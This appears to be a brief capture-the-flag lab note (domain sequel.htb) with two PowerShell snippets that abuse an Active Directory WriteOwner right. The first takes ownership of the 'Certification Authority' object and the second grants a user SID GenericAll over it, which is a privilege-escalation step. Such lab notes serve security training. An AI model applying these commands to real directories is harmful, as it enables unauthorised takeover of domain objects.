# WriteOwner

```
$acl = Get-ACL "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
$identityReference = New-Object System.Security.Principal.NTAccount("sequel", "ryan")
$acl.SetOwner($identityReference)
Set-ACL -Path "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb" -AclObject $acl
```

Set the Owner self on the object and then get us all rights on that object

```
$objectDN = "CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
$userSID = "S-1-5-21-548670397-972687484-3496335370-1114"
$adObject = Get-ADObject -Identity $objectDN
$acl = Get-Acl -Path "AD:\$objectDN"
$identity = New-Object System.Security.Principal.SecurityIdentifier($userSID)
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type = [System.Security.AccessControl.AccessControlType]::Allow
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\$objectDN" -AclObject $acl
```
